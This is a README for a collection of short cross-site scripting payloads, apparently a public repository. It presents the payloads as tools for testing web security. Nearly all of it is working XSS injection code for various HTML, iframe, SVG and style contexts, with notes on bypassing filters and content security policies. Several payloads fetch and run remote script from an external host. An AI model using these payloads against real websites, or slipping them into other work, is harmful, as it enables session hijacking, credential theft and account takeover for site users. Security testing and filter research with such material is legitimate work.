# Tiny-XSS-Payloads

This is a curated set of small but powerful Cross-Site Scripting (XSS) payloads 💥 designed to exploit vulnerabilities in different web application contexts. These payloads can be used to test and identify weak points in web security 🔐. A collection of short XSS payloads that can be used in different contexts.

The DEMO available here: <https://tiny-xss-payloads.netlify.app/>

📚 Why Tiny Payloads?
------------------------------
⚡ Lightweight: Easily bypass filters due to their minimal size.

🎯 Targeted: Crafted for specific scenarios (e.g., HTML, JavaScript, URLs).

🛡️ Efficient Testing: Quick checks for XSS vulnerabilities.

## Current Payloads

```html
<!-- Requires a relative script inserted to the DOM after the sink, 
  e.g. <base/href=//Ǌ.₨> ... <script src=/aaa></script> -->
<base/href=//Ǌ.₨>
```

```html
<!-- Only works as reflected XSS -->
<svg/onload=eval(name)>
```

```html
<!-- If you control the URL -->
<svg/onload=eval(`'`+URL)>
```

```html
<!-- If you control the name, but unsafe-eval not enabled -->
<svg/onload=location=name>
```

```html
<!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM -->
<svg><svg/onload=eval(name)>
```

```html
<!-- If you control window's name, this payload will work inside innerHTML, even on elements not yet inserted into the DOM -->
<audio/src/onerror=eval(name)>
```

```html
<!-- If you control the URL, this payload will work inside innerHTML, even on elements not yet inserted into the DOM -->
<img/src/onerror=eval(`'`+URL)>
```

```html
<!-- Just a casual script -->
<script/src=//Ǌ.₨></script>
```

```html
<!-- If you control the name of the window -->
<iframe/onload=src=top.name>
```

```html
<!-- If you control the URL -->
<iframe/onload=eval(`'`+URL)>
```

```html
<!-- If number of iframes on the page is constant -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>
```

```html
<!-- for Firefox only -->
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">
```

```html
<!-- If number of iframes on the page is random -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>
```

```html
<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
```

```html
<!-- If inline styles are allowed -->
<style/onload=eval(name)>
```

```html
<!-- If inline styles are allowed and the URL can be controlled -->
<style/onload=eval(`'`+URL)>
```

```html
<!-- If inline styles are blocked -->
<style/onerror=eval(name)>
```

```html
<!-- Uses external script as import, doesn't work in innerHTML -->
<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
<svg/onload=import(/\\Ǌ.₨/)>
```

```html
<!-- Uses external script as import,  triggers if inline styles are allowed.
<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
<style/onload=import(/\\Ǌ.₨/)>
```

```html
<!-- Uses external script as import -->
<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
<iframe/onload=import(/\\Ǌ.₨/)>
```

Deprecated:

```html
<!-- If you control the URL, Safari-only -->
<iframe/onload=write(URL)>
```

```html
<!-- If inline styles are allowed, Safari only -->
<style/onload=write(URL)>
```
Information
------------------

Author❤️: [UTTAM BODARA](https://buymeacoffee.com/uttambodara)

License💀: [MIT License](https://opensource.org/licenses/MIT)
